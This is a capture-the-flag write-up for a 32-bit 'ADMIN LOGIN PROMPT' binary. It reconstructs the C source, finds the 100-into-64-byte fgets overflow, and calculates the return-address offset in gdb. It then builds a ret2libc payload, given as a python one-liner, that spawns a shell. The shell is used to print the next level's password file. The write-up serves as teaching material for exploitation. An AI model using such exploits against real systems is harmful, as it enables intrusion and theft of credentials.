# Level01

## Answer
Our C source code generates the same assembly code as the original binary. Compile it as follows:
```
gcc -fno-stack-protector -m32 -z execstack source.c
```

Let's take a look at the source code:
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char a_user_name[256];

int verify_user_name()
{
    puts("verifying username....\n");
    return strncmp(a_user_name, "dat_wil", 7);
}

int verify_user_pass(char *a_user_pass)
{
    return strncmp(a_user_pass, "admin", 5);
}

// line differences on main+11 and main+15 (extra use of eax)
int main()
{
    char buf[64]; // 0x1c(%esp)
    int ret; // 0x5c(%esp)

    memset(buf, 0, 64);
    ret = 0;

    puts("********* ADMIN LOGIN PROMPT *********");

    printf("Enter Username: ");
    fgets(a_user_name, 256, stdin);
    ret = verify_user_name();
    if (ret != 0)
    {
        puts("nope, incorrect username...");
        return 1;
    }

    puts("Enter Password: ");
    fgets(buf, 100, stdin);
    ret = verify_user_pass(buf);
    if (ret == 0 || ret != 0)
    {
        puts("nope, incorrect password...");
        return 1;
    }

    return 0;
}
```

Let's focus on the `main` function. It reads input using the `fgets` function, which is known to be safe as it has a mechanism to limit the number of bytes read. However, we're reading 100 bytes in `buf` which only has 64 bytes allocated on the stack. This will allow us to overflow the buffer and overwrite the return address of the `main` function.

Let's analyze the stack layout of our program:
```bash
(gdb) b *main+226 # Breaking before leave and pop instructions
Breakpoint 1 at 0x80485b2

(gdb) r # Run the program
Starting program: /home/users/level01/level01
********* ADMIN LOGIN PROMPT *********
Enter Username:
verifying username....

nope, incorrect username...


Breakpoint 1, 0x080485b2 in main ()

(gdb) info registers # Check esp and ebp addresses
[...]
esp            0xffffd6a0       0xffffd6a0
ebp            0xffffd708       0xffffd708
[...]
```

By calculating the difference between `esp` and `ebp` we can see that the stack is allocated 104 bytes:
```
0xffffd708 - 0xffffd6a0 = 68 (104 in decimal)
```	

Furthermore, we can see that our buffer is located at `0x1c(%esp)`. Since there is 104 bytes for the stack, our buffer will therefore require 76 bytes (104 - 28) before reaching `ebp`.

Since our goal is to overflow the stack until we reach the return address of the main function, we need to add another 4 bytes to go from `ebp` to `ebp + 4` (the return address). So a total of 80 bytes (76 + 4).
> If you're struggling, you can just use a [Buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/), to find the offset of the return address. However, it is recommended to understand the stack layout and how to calculate the offset yourself.

Anything written beyond those 80 bytes will be treated as an address (only the 4 next bytes) and jumped to by the `ret` instruction of the `main` function.

There are different ways to solve this challenge, we'll only cover the `ret2libc` method.
> When we refer to padding, we mean the bytes we need to write before reaching the return address.

### Ret2libc

#### Explanation
Ret2Libc (Return-to-Libc) is an exploit technique that redirects the program flow to execute existing library functions.

A typical Ret2Libc exploit is constructed as follows:
```
padding + address of system + address of exit + address of "/bin/sh"
```
> The address of exit is actually optional, but not providing it will cause the program to crash after executing the system function.

#### Exploit
We, therefore, need the addresses of the `system`, `exit` functions and the string `/bin/sh` in memory. These are found using GDB:

```bash
# System
(gdb) info function system
0xf7e6aed0  system
[...]

# Exit
(gdb) info function exit
0xf7e5eb70  exit
[...]

# /bin/sh
(gdb) info proc mappings
[...]
0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
[...]
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.
```

Alright, let's craft our payload:
```
reminder: padding + address of system + address of exit + address of "/bin/sh"

"\x90"*80 + "\xf7\xe6\xae\xd0" + "\xf7\xe5\xeb\x70" + "\xf7\xf8\x97\xec"
```

Here's the complete exploit:
```python
(python -c 'print("dat_wil"); print("\x90"*80+"\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1])'; cat)| ./level01
```
> We also have to provide the username `dat_wil` to pass the first check from the `verify_user_name` function.

Let's run it:
```bash
(python -c 'print("dat_wil"); print("\x90"*80+"\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1])'; cat)| ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

We are now level02! Let's move on to the next level.